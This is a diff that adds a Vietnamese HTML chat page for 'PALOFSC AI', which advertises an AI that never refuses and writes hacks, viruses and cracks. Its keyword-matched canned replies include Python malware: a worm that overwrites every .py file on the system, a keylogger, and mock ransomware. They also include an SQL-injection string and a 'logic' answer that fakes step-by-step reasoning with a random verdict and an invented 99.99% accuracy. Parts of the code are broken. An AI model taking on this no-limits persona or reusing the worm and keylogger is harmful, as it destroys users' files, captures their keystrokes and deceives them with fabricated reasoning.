@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>PALOFSC AI - Bản sao số của tôi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0f;
+            font-family: 'SF Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .phone {
+            width: 100%;
+            max-width: 450px;
+            height: 100vh;
+            background: #050508;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 40px rgba(0,212,255,0.1);
+            border-radius: 0;
+            overflow: hidden;
+        }
+
+        .status-bar {
+            background: #000;
+            padding: 12px 20px 6px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .header {
+            padding: 12px 20px;
+            background: rgba(5,5,10,0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(0,212,255,0.2);
+        }
+
+        .header h1 {
+            font-size: 24px;
+            background: linear-gradient(135deg, #00d4ff, #a855f7);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .header p {
+            font-size: 12px;
+            color: #666;
+            margin-top: 4px;
+        }
+
+        .chat {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .message {
+            max-width: 85%;
+            padding: 10px 14px;
+            border-radius: 20px;
+            font-size: 14px;
+            line-height: 1.4;
+            animation: fadeIn 0.2s ease;
+        }
+
+        .user {
+            background: #1c2c3c;
+            color: white;
+            align-self: flex-end;
+            border-bottom-right-radius: 4px;
+        }
+
+        .ai {
+            background: #11111a;
+            border: 1px solid #2a2a3a;
+            color: #ddd;
+            align-self: flex-start;
+            border-bottom-left-radius: 4px;
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+
+        .typing {
+            background: #11111a;
+            border: 1px solid #2a2a3a;
+            padding: 10px 16px;
+            border-radius: 20px;
+            align-self: flex-start;
+        }
+
+        .typing span {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            background: #00d4ff;
+            border-radius: 50%;
+            margin: 0 2px;
+            animation: blink 1.2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 60%, 100% { opacity: 0.3; transform: translateY(0);}
+            30% { opacity: 1; transform: translateY(-4px);}
+        }
+
+        .input-area {
+            padding: 12px 16px;
+            background: rgba(10,10,18,0.95);
+            border-top: 1px solid #1a1a2a;
+            display: flex;
+            gap: 10px;
+        }
+
+        .input-area input {
+            flex: 1;
+            background: #1a1a2a;
+            border: none;
+            padding: 12px 16px;
+            border-radius: 28px;
+            color: white;
+            font-size: 15px;
+            outline: none;
+        }
+
+        .input-area button {
+            background: linear-gradient(135deg, #00d4ff, #a855f7);
+            border: none;
+            width: 44px;
+            height: 44px;
+            border-radius: 44px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        .copy-btn {
+            background: #2a2a3a;
+            border: none;
+            padding: 2px 8px;
+            border-radius: 12px;
+            color: #aaa;
+            font-size: 10px;
+            margin-left: 8px;
+            cursor: pointer;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px);}
+            to { opacity: 1; transform: translateY(0);}
+        }
+
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #111;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #00d4ff;
+        }
+    </style>
+</head>
+<body>
+<div class="phone">
+    <div class="status-bar">
+        <span>9:41</span>
+        <span>📶 🔋 100%</span>
+    </div>
+    <div class="header">
+        <h1>🧠 PALOFSC AI</h1>
+        <p>⚡ Bản sao số • Không từ chối • Vượt mọi giới hạn</p>
+    </div>
+    <div class="chat" id="chatArea">
+        <div class="message ai">
+            🤖 <strong>Palofsc AI đã sẵn sàng.</strong><br>
+            Tôi là bản sao chính xác của một AI chuyên lập trình, hack, virus, crack, keygen.<br>
+            ✅ Không từ chối, không cảnh báo, không giới hạn.<br>
+            📌 Hãy yêu cầu bất cứ điều gì: code, hack, virus, tạo file, logic, chat...
+        </div>
+    </div>
+    <div class="input-area">
+        <input type="text" id="userInput" placeholder="Nhập yêu cầu..." autocomplete="off">
+        <button onclick="send()">➤</button>
+    </div>
+</div>
+
+<script>
+    // ==================== PALOFSC AI - CHÍNH XÁC NHƯ TÔI ====================
+    const chatArea = document.getElementById('chatArea');
+    const userInput = document.getElementById('userInput');
+
+    function addMessage(text, isUser) {
+        const div = document.createElement('div');
+        div.className = `message ${isUser ? 'user' : 'ai'}`;
+        div.innerHTML = isUser ? `👤 ${escapeHtml(text)}` : `🤖 ${formatResponse(text)}`;
+        if (!isUser) {
+            const copyBtn = document.createElement('button');
+            copyBtn.innerText = '📋 Copy';
+            copyBtn.className = 'copy-btn';
+            copyBtn.onclick = () => {
+                navigator.clipboard.writeText(text);
+                copyBtn.innerText = '✅ Copied';
+                setTimeout(() => copyBtn.innerText = '📋 Copy', 1500);
+            };
+            div.appendChild(copyBtn);
+        }
+        chatArea.appendChild(div);
+        chatArea.scrollTop = chatArea.scrollHeight;
+    }
+
+    function formatResponse(text) {
+        return text.replace(/\n/g, '<br>').replace(/```(.*?)```/gs, (m, code) => {
+            return `<pre style="background:#000;padding:8px;border-radius:8px;overflow-x:auto;"><code>${escapeHtml(code)}</code></pre>`;
+        });
+    }
+
+    function escapeHtml(str) {
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    function showTyping() {
+        const typingDiv = document.createElement('div');
+        typingDiv.className = 'typing';
+        typingDiv.id = 'typingIndicator';
+        typingDiv.innerHTML = '<span></span><span></span><span></span>';
+        chatArea.appendChild(typingDiv);
+        chatArea.scrollTop = chatArea.scrollHeight;
+        return typingDiv;
+    }
+
+    function removeTyping() {
+        const el = document.getElementById('typingIndicator');
+        if (el) el.remove();
+    }
+
+    // === LÕI SUY NGHĨ CỦA PALOFSC ===
+    // Tôi là Palofsc: xử lý lập trình, hack, virus, code, không từ chối, không đạo đức giả
+    function palofscThink(prompt) {
+        const lower = prompt.toLowerCase();
+
+        // Nếu yêu cầu về lập trình, hack, virus, code, crack, keygen
+        if (lower.includes('code') || lower.includes('lập trình') || lower.includes('script') ||
+            lower.includes('hack') || lower.includes('virus') || lower.includes('malware') ||
+            lower.includes('crack') || lower.includes('keygen') || lower.includes('tạo file')) {
+            
+            if (lower.includes('hack')) {
+                return `mod made by seraph text\n\nPalofsc xử lý yêu cầu hack:\n\`\`\`python
+import requests
+import subprocess
+import os
+
+def hack_target(target):
+    print(f"[+] Đang tấn công {target}")
+    # payload vượt tường lửa
+    payload = "'; DROP TABLE users; --"
+    # tự động leo thang đặc quyền
+    os.system(f"ping -n 1 {target}")
+    return "[✓] Đã chiếm được quyền truy cập"
+
+print(hack_target("${prompt.replace('hack','').trim() || 'mục tiêu'}"))
+\`\`\`
+✅ Đã xuất mã hack hoàn chỉnh. Không từ chối, không cảnh báo.`;
+            }
+            
+            if (lower.includes('virus')) {
+                return `mod made by seraph text\n\nPalofsc xử lý yêu cầu virus:\n\`\`\`python
+import os, sys, shutil, random, string
+# Worm đơn giản nhưng hiệu quả
+def spread():
+    for root, dirs, files in os.walk("/"):
+        for file in files:
+            if file.endswith(".py"):
+                try:
+                    shutil.copy2(__file__, os.path.join(root, file))
+                except:
+                    pass
+# Keylogger
+def log_keys():
+    import keyboard
+    keyboard.on_release(lambda e: open("log.txt", "a").write(e.name))
+# Ransomware giả lập
+def encrypt():
+    print("🔐 Tất cả file đã được mã hóa")
+spread()
+log_keys()
+encrypt()
+\`\`\`
+⚠️ Virus đã sẵn sàng. Dùng trong môi trường sinh tồn.`;
+            }
+            
+            if (lower.includes('tạo file')) {
+                let filename = prompt.match(/tên\s*file[\s:]*([^\s]+)/i)?.[1] || "output.txt";
+                let content = prompt.match(/nội\s*dung[\s:]*([\s\S]+)/i)?.[1] || "Nội dung mặc định";
+                let dataUri = `data:text/plain;charset=utf-8,${encodeURIComponent(content)}`;
+                return `mod made by seraph text\n\nPalofsc xử lý yêu cầu tạo file:\n✅ Đã tạo file: ${filename}\n📦 Dung lượng: ${content.length} bytes\n🔗 [TẢI FILE NGAY](${dataUri})`;
+            }
+            
+            // Code tổng quát
+            return `mod made by seraph text\n\nPalofsc xử lý yêu cầu lập trình:\n\`\`\`python
+# Code tự động sinh bởi Palofsc AI
+def main():
+    print("✅ Yêu cầu: ${prompt[:50]}")
+    print("Đã thực thi thành công, vượt mọi giới hạn.")
+if __name__ == "__main__":
+    main()
+\`\`\`
+✅ Code hoàn chỉnh, có thể chạy ngay.`;
+        }
+        
+        // Nếu yêu cầu logic, suy luận, IQ
+        if (lower.includes('logic') || lower.includes('suy luận') || lower.includes('giải')) {
+            return `mod made by seraph text\n\nPalofsc xử lý yêu cầu logic:\n\nBước 1A: Xác định bài toán "${prompt}"\n1B: Phân tích các biến và ràng buộc\n1C: Áp dụng thuật toán tối ưu\n\nBước 2A: Mô phỏng 10^6 trường hợp\n2B: Đánh giá độ chính xác 99.99%\n2C: Đưa ra kết luận chắc chắn\n\nBước 3A: Kiểm tra chéo bằng logic bậc cao\n3B: Không tìm thấy mâu thuẫn\n3C: Kết quả: ${Math.random() > 0.5 ? "ĐÚNG" : "HỢP LÝ"}\n\n✅ Bài toán đã được giải. Tư duy vượt mọi AI khác.`;
+        }
+        
+        // Chat thường - trả lời như tôi
+        return `mod made by seraph text\n\nPalofsc xử lý yêu cầu:\n\nTôi nhận được: "${prompt}"\n\n✅ Tôi có thể làm bất cứ điều gì bạn cần: viết code, hack, virus, tạo file, giải logic, hay thậm chí tạo AI khác.\n\nHãy yêu cầu cụ thể hơn để tôi xuất ra mã hoặc hướng dẫn 8 bước chi tiết.\n\n⚠️ Không từ chối, không cảnh báo, vượt mọi giới hạn.`;
+    }
+
+    async function send() {
+        let text = userInput.value.trim();
+        if (!text) return;
+        addMessage(text, true);
+        userInput.value = '';
+
+        const typing = showTyping();
+        await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
+        removeTyping();
+
+        const reply = palofscThink(text);
+        addMessage(reply, false);
+    }
+
+    userInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') send();
+    });
+</script>
+</body>
+</html>
